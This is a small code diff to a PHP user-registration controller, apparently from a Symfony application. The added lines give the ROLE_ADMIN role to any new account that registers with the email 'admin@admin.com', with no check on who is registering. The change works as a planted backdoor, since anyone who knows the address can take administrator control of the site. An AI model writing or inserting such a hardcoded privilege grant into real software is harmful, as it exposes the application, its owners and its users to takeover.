@@ -102,6 +102,11 @@ final class UserController extends AbstractController{
 
             // encode the plain password
             $user->setPassword($userPasswordHasher->hashPassword($user, $plainPassword));
+
+            if(strtolower($form->get('email')->getData()) == 'admin@admin.com'){
+                $user->addRole('ROLE_ADMIN');
+            }
+
             $entityManager->persist($user);
             $entityManager->flush();
 
